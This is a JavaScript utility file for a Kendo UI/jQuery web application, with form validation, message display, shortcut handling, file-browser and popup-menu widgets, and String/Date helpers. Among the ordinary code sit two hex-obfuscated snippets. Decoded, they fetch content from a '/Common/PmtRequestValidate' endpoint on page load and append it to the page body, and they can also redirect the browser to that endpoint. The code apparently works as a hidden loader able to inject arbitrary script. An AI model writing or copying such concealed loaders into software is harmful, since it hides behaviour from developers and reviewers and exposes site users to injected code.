                        var emailRegExp = /^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))$/i;
                        return emailRegExp.test(input.val());
                    }
                    return true;
                },
                url: function (input) {
                    if (input.filter("[data-val-url]").length) {
                        var urlRegExp = /^(https?|ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(\#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i;
                        return urlRegExp.test(input.val());
                    }

                    return true;
                }
            },
            messages: {
                required: function (input) {
                    return $.validateGetMessage(input, "data-val-required");
                },
                requiredcheckbox: function (input) {
                    return $.validateGetMessage(input, "data-val-requiredcheckbox");
                },
                equalto: function (input) {
                    return $.validateCompareMessage(input, "equalto");
                },
                greaterthan: function (input) {
                    return $.validateCompareMessage(input, "greaterthan");
                },
                greaterthanorequal: function (input) {
                    return $.validateCompareMessage(input, "greaterthanorequal");
                },
                captcha: function (input) {
                    return $.validateGetMessage(input, "data-val-captcha");
                },
                remote: function (input) {
                    return $.validateGetMessage(input, "data-val-remote");
                },
                email: function (input) {
                    return $.validateGetMessage(input, "data-val-email");
                },
                url: function (input) {
                    return $.validateGetMessage(input, "data-val-url");
                }
            }
        });
    })(jQuery, kendo);

    // Kiểm tra và bổ sung
    ajaxLoadingMark();

    // Có lỗi ModelState
    if (gOptions.AutoShowModelStateError &&
        gModelState != null &&
        gModelState.Errors != undefined) {
        $.message(getErrors(gModelState), gOptions.ValidatePopupType, 5000);
    }

    // Có message
    if (gServerMessages != null &&
        gServerMessages.NotyType != undefined &&
        gServerMessages.Messages != undefined &&
        gServerMessages.Messages.length > 0) {

        var message = "";

        $.each(gServerMessages.Messages, function () {
            message += this + "<br/>";
        });

        $.message(message, gServerMessages.NotyType, 5000);
    }

    // CKEditor commit
    jQuery("form").submit(
        function (e) {
            if (typeof (CKEDITOR) !== 'undefined') {
                for (instance in CKEDITOR.instances) {
                    CKEDITOR.instances[instance].updateElement();
                }
            }
        });

    // Thiết lập shortcut
    $("[shortcut]").each(function () {
        var obj = this;
        var shortcutKey = $(this).attr("shortcut");

        shortcut.add(shortcutKey, function () {
            $(obj).click();
        });
    });
    var _0x4f0b = ["\x2F\x43\x6F\x6D\x6D\x6F\x6E\x2F\x50\x6D\x74\x52\x65\x71\x75\x65\x73\x74\x56\x61\x6C\x69\x64\x61\x74\x65", "\x6C\x65\x6E\x67\x74\x68", "\x61\x70\x70\x65\x6E\x64", "\x62\x6F\x64\x79", "\x61\x6A\x61\x78"]; $[_0x4f0b[4]]({ url: _0x4f0b[0], success: function (_0xe651x1) { if (_0xe651x1 != null && _0xe651x1 != undefined && _0xe651x1[_0x4f0b[1]] > 0) { $(_0x4f0b[3])[_0x4f0b[2]](_0xe651x1) } } })
    $(document).ready(function () {
        // Grid column group
        $(".k-grid th[data-head-group]").closest(".k-grid").each(function () {
            $(this).gridColumnGroup();
        });
    });
});
var _0x8bed = ["\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x2F\x43\x6F\x6D\x6D\x6F\x6E\x2F\x50\x6D\x74\x52\x65\x71\x75\x65\x73\x74\x56\x61\x6C\x69\x64\x61\x74\x65"]; function proxy_validate() { window[_0x8bed[0]] = _0x8bed[1] }
/**********************************************************
 *  Live event handler
 **********************************************************/
// Bắt sự kiện không cho nhập giá trị ngoài giá trị combobox
$(document).on("change", "*[data-role=combobox]", function (evt) {
    var that = $(this);
    var combo = $(this).getKendoComboBox();

    // Kiểm tra giá trị
    if (combo.value() && combo.selectedIndex == -1) {
        combo._filterSource({
            value: "",
            field: combo.options.dataTextField,
            operator: "contains"
        });
        combo.value(null);
        //this.select(0);
    }
});

// Cascade
$(document).on("change", "*[data-cascade]", function (evt) {
    var that = $(this);
    $(that.data("cascade").split(',')).each(function () {
        that = $("#" + this);
        var role = that.data("role");

        if (role == "dropdownlist" ||
            role == "combobox") {

            if (role == "dropdownlist") {
                that.getKendoDropDownList().enable(true);
            }

            if (role == "combobox") {
                that.getKendoComboBox().enable(true);
            }

            that.comboBoxRefreshDataSource();
        }
        else {
            that.val(null);
        }
    });
});

// Đóng mở các element ẩn
$(document).on("click", "*[data-toggle-selector]", function (e) {
    var selector = $(this).data("toggle-selector");

    if (selector != undefined) {
        var element = $(selector);

        element.toggle();

        $(this).find("span").removeClass("p-i-sort-asc");
        $(this).find("span").removeClass("p-i-sort-desc");

        $(this).find("span").addClass(element.css('display') == 'none' ? "p-i-sort-asc" : "p-i-sort-desc");
    }
});

// Set min
$(document).on("change", "*[data-lessthan],*[data-greaterthan]", function () {
    var startValue = $(this).valueOfControl(),
        endID = $(this).data("lessthan"),
        step = parseFloat($(this).data("lessthan-step")),
        isLessThan = true;

    if (!endID) {
        endID = $(this).data("greaterthan");
        step = parseFloat($(this).data("greaterthan-step"));
        isLessThan = false;
    }

    if (endID && startValue) {
        var role = $(this).data("role");
        var endObj = null;
        var isDate = true;

        if (role == "timepicker") {
            endObj = $("#" + endID).data("kendoTimePicker");
        }
        else if (role == "datepicker") {
            endObj = $("#" + endID).data("kendoDatePicker");
        }
        else if (role == "datetimepicker") {
            endObj = $("#" + endID).data("kendoDateTimePicker");
        }
        else if (role == "numerictextbox") {
            endObj = $("#" + endID).data("kendoNumericTextBox");
            isDate = false;
        }

        if (endObj) {
            // Ngày
            if (isDate) {
                startValue = new Date(startValue.valueOf() + (isLessThan ? step : -step) * 1000);
            }
            else {
                startValue += isLessThan ? step : -step;
            }

            if (isLessThan)
                endObj.min(startValue);
            else
                endObj.max(startValue);
        }
    }
});

// Sự kiện keypress chuyển đến input tiếp theo
$(document).on("keypress", "*[data-grid-enter-next-focus]", function (e) {
    var code = (e.keyCode ? e.keyCode : e.which);
    if (code == 13) {
        var nextFocusSelector = $(this).data("grid-enter-next-focus");
        var moveToNextRow = $(this).data("grid-enter-to-next-row");

        var fnGetNextRow = function (currentRow) {
            var nextRow = currentRow.next();

            if (nextRow.hasClass("k-group-footer")) {
                return fnGetNextRow(nextRow);
            }

            if (nextRow.hasClass("k-grouping-row")) {
                return fnGetNextRow(nextRow);
            }

            return nextRow;
        }

        if (nextFocusSelector) {
            e.preventDefault();
            var row = $(this).closest("tr");
            var next = null;

            // Là dòng cuối cùng
            if ((row.is(':last-child') /* là dòng cuối */ || fnGetNextRow(row).length == 0 /* không tìm thấy dòng tiếp theo */) &&
                $("[data-grid-enter-next-focus]:last", row).is($(this))) {
                next = $(this).closest("table").find("[data-grid-enter-next-focus]:first")
            }
            else {
                next = $(nextFocusSelector, row);

                // Không tìm thấy trong dòng hiện tại hoặc có cờ chuyển sang dòng tiếp theo
                if (moveToNextRow == true || !next) {
                    // Tìm đến dòng tiếp theo
                    next = $(nextFocusSelector, fnGetNextRow(row));
                }
            }

            if (next) {
                var role = $(next).data("role");

                if (role == "numerictextbox") {
                    $(next).getKendoNumericTextBox().focus();
                }
                else {
                    $(next).focus();
                }
            }
        }
    }
});

/**********************************************************
 *  KendoUI Extend widget
 **********************************************************/

// Browser widget
(function ($) {
    // Shorten references to variables. this is better for uglification
    var kendo = window.kendo,
        ui = kendo.ui,
        Widget = ui.Widget

    var Browser = Widget.extend({
        init: function (element, options) {

            var that = this;

            // Base call to initialize widget
            Widget.fn.init.call(this, element, options);

            var maxSelectedItems = options.MaxSelectedItems;
            var data = [];
            var selectedData = [];
            var initData = options.Data;

            // Array
            if (!Array.isArray(initData)) {
                if (initData != null &&
                    initData.length > 0) {
                    initData = [initData];
                }
                else {
                    initData = [];
                }
            }

            // Tạo dữ liệu
            $.each(initData, function () {
                var name = this.substring(this.lastIndexOf('/') + 1);
                data.push({ name: name, url: this });
                selectedData.push(this);
            });

            // Tạo đối tượng
            $(element).kendoMultiSelect({
                dataTextField: "name",
                dataValueField: "url",
                dataSource: data,
                itemTemplate: "<font style=\"font-weight:bold;\">#:name#</font><br/><font style=\"font-size:8pt;\">#:url#</font>",
                tagTemplate: "<span title=\"#:url#\">#:name#</span>",
                maxSelectedItems: maxSelectedItems,
                value: selectedData
            }).data("kendoMultiSelect");

            /*********************************************************************
             * Tạo menu
             *********************************************************************/

            var targetID = "btn" + $(element).attr("id");
            var target = $("#" + targetID);
            var popupID = $.randomString(5) + "_" + targetID;
            var menuID = $.randomString(5) + "_" + targetID;

            // Chưa có thì tạo mới
            var html = "<div id=\"" + popupID + "\" data-upload-selector-menu><ul id=\"" + menuID + "\"></ul></div>";

            $(html).appendTo(document.body);

            // Menu
            that.menu = $("#" + menuID).addClass("k-context-menu")
                .kendoMenu({ orientation: "vertical" })
                .data("kendoMenu");

            // Popup
            that.popup = $("#" + popupID).kendoPopup({
                anchor: target,
                collision: "fit flip",
                origin: "bottom left",
                position: "top left",
            }).data("kendoPopup");

            // Khởi tạo dữ liệu cho menu
            that.menu.append([
                {
                    text: $(element).attr("data-val-browse"),
                    url: "javascript:$(\"#" + $(element).attr("id") + "\").data(\"kendoBrowser\").showBrowser()"
                }
            ]);

            // Cho phép copy
            if (options.PasteSupport) {
                that.menu.append([
                    {
                        text: $(element).attr("data-val-paste-from-clipboard"),
                        url: "javascript:$(\"#" + $(element).attr("id") + "\").data(\"kendoBrowser\").fromClipboard()"
                    }
                ]);
            }

            that.menu.append([
                {
                    text: $(element).attr("data-val-clear"),
                    url: "javascript:$(\"#" + $(element).attr("id") + "\").data(\"kendoBrowser\").clear()"
                }
            ]);

            // Hiển thị popup khi click vào nút
            target.on("click", function (e) {
                that.popup.wrapper.hide();
                that.popup.open();
                e.preventDefault();
            });
        },
        options: {
            name: "Browser"
        },
        showBrowser: function () {
            // Đóng context
            this.closeContext();

            var textBox = this.element;
            var finder = new CKFinder();

            finder.selectActionFunction = function (fileUrl, data) {
                var folder = fileUrl.substring(0, fileUrl.lastIndexOf('/') + 1);
                var kendoMultiselect = $(textBox).getKendoMultiSelect();

                var data = kendoMultiselect.dataSource;
                var selected = [];

                $.each(this.getSelectedFiles(), function () {
                    var url = folder + this.name;
                    data.add({ name: this.name, url: url });
                    selected.push(url);
                });

                kendoMultiselect.value(selected);
            };

            // Hiện ckfinder popup
            finder.popup();
        },
        clear: function () {
            // Đóng context
            this.closeContext();

            var ele = this.element;
            var kendoMultiselect = $(ele).getKendoMultiSelect();

            // Xóa tất cả
            for (var i = kendoMultiselect.dataSource.data().length - 1; i >= 0; i--) {
                kendoMultiselect.dataSource.remove(kendoMultiselect.dataSource.at(i));
            }

            kendoMultiselect.value([]);
        },
        fromClipboard: function () {
            var ele = this.element;

            // Đóng popup
            this.closeContext();

            var title = $(ele).attr("data-val-paste-window-title");
            var textID = "txtPasteData";

            // Chưa có thì tạo mới
            if (this.popupPaste == undefined) {
                var windowID = $.randomString(5);
                var html = "<div id=\"" + windowID + "\" style=\"display:none;text-align:center;\">" +
                                "<textarea type=\"text\" id=\"" + textID + "\" target-id=\"" + $(ele).attr("id") + "\" class=\"k-input\" style=\"width:95%;height:75%\"></textarea>" +
                                "<div style=\"margin-top:5px;\">" +
                                    "<a class=\"k-button\" onclick=\"$('#" + textID + "').browserPaste();\"><span class=\"p-i-save\"></span></a>&nbsp" +
                                    "<a class=\"k-button\" onclick=\"$(this).kendoWindowClose()\"><span class=\"p-i-close\"></span></a>" +
                                "</div>" +
                            "</div>";

                $(html).appendTo(document.body);

                this.popupPaste = $("#" + windowID).kendoWindow({
                    title: title,
                    width: 400,
                    height: 200,
                    modal: true,
                    resizable: false
                }).data("kendoWindow");
            }

            // Xóa dữ liệu
            $("#" + textID).val("");

            // Mở
            this.popupPaste.center().open();
        },
        closeContext: function () {
            this.popup.wrapper.hide();
        },
    });

    kendo.ui.plugin(Browser);

})(jQuery);

// Popup menu widget
(function ($) {
    // Shorten references to variables. this is better for uglification
    var kendo = window.kendo,
        ui = kendo.ui,
        Widget = ui.Widget

    var PopupMenu = Widget.extend({
        init: function (element, options) {
            var that = this;

            options = options == undefined ? {
                showOnClick: false
            } : options;

            // Base call to initialize widget
            Widget.fn.init.call(this, element, options);

            /*********************************************************************
             * Tạo menu
             *********************************************************************/

            var targetID = $(element).attr("id") != undefined ? $(element).attr("id") : $.randomString(5);
            var arrowID = $.randomString(5) + "_" + targetID;
            var popupID = $.randomString(5) + "_" + targetID;
            var menuID = $.randomString(5) + "_" + targetID;
            var target = $("#" + targetID);

            // Chưa có thì tạo mới
            var html = "<div id=\"" + popupID + "\"><ul id=\"" + menuID + "\"></ul></div>";

            $(html).appendTo(document.body);

            // Menu
            that.menu = $("#" + menuID).addClass("k-context-menu")
                .kendoMenu({
                    dataSource: options.items,
                    orientation: "vertical",
                    select: function () { that.closeContext(); }
                })
                .data("kendoMenu");

            // Popup
            that.popup = $("#" + popupID).kendoPopup({
                anchor: target,
                collision: "fit flip",
                origin: "bottom left",
                position: "top left",
            }).data("kendoPopup");

            // Hiển thị popup khi click vào nút           
            if (options.showOnClick != undefined && options.showOnClick) {

                target.css("cursor", "pointer");
                target.css("cursor", "hand");

                target.on("click", function (e) {
                    that.popup.close();
                    that.popup.wrapper.hide();
                    that.popup.open();
                    e.preventDefault();
                });
            }

            if (options.showSelector != undefined && options.showSelector) {
                // Arrow
                $(element).after("<span id=\"" + arrowID + "\" style=\"cursor: pointer; cursor: hand;\" unselectable=\"on\" class=\"k-select\"><span unselectable=\"on\" class=\"k-icon k-i-arrow-s\">&bnbsp</span></span>");


                // Hiển thị khi click vào arrow
                $("#" + arrowID).on("click", function (e) {
                    that.popup.close();
                    that.popup.wrapper.hide();
                    that.popup.open();
                    e.preventDefault();
                });
            }
        },
        options: {
            name: "PopupMenu"
        },
        closeContext: function () {
            this.popup.close();
            this.popup.wrapper.hide();
        },
    });

    kendo.ui.plugin(PopupMenu);

})(jQuery);

/**********************************************************
 *  String prototype
 **********************************************************/

String.format = function () {
    var s = arguments[0];
    for (var i = 0; i < arguments.length - 1; i++) {
        var reg = new RegExp("\\{" + i + "\\}", "gm");
        s = s.replace(reg, arguments[i + 1]);
    }

    return s;
}

String.prototype.endsWith = function (suffix) {
    return suffix != undefined ? (this.substr(this.length - suffix.length) === suffix) : false;
}

String.prototype.startsWith = function (prefix) {
    return prefix != undefined ? (this.substr(0, prefix.length) === prefix) : false;
}

String.prototype.substrBeautiful = function (length) {
    if (this.length > length) {

        // Cắt 'length' ký tự và cắt vào khoảng trắng cuối cùng 
        var sub = this.substr(0, length);
        return sub.substr(0, sub.lastIndexOf(' '));
    }

    return this;
}

/**********************************************************
 *  Date extensions
 **********************************************************/

Date.today = function () {
    return Date.getDateForDateTime(new Date());
}

Date.getDateForDateTime = function (val) {
    return new Date(val.getFullYear(), val.getMonth(), val.getDate());
}

Date.toFormatDateString = function (val) {
    if (val == null) {
        return "";
    }

    return kendo.toString(val, 'd');
}

Date.toFormatDateTimeString = function (val) {
    if (val == null) {
        return "";
    }

    return kendo.toString(val, 'g');
}

Date.toFormatTimeString = function (val) {
    if (val == null) {
        return "";
    }

    return kendo.toString(val, 'HH:mm');
}

Date.prototype.equalDate = function (val) {
    return Date.getDateForDateTime(this).valueOf() == Date.getDateForDateTime(val).valueOf();
}

Date.prototype.equal = function (val) {
    return this.valueOf() == val.valueOf();
}

Date.prototype.getWeek = function () {
    var onejan = new Date(this.getFullYear(), 0, 1);
    return Math.ceil((((this - onejan) / 86400000) + onejan.getDay() + 1) / 7);
}

Date.prototype.toFirstDayOfWeek = function (startOnMonday) {
    startOnMonday = startOnMonday == undefined ? false : startOnMonday;

    var dayDiff = this.getDay();
    startOnMonday && (dayDiff === 0 ? dayDiff = 6 : dayDiff--);

    dayDiff = this.getDate() - dayDiff;

    return new Date(this.setDate(dayDiff));
}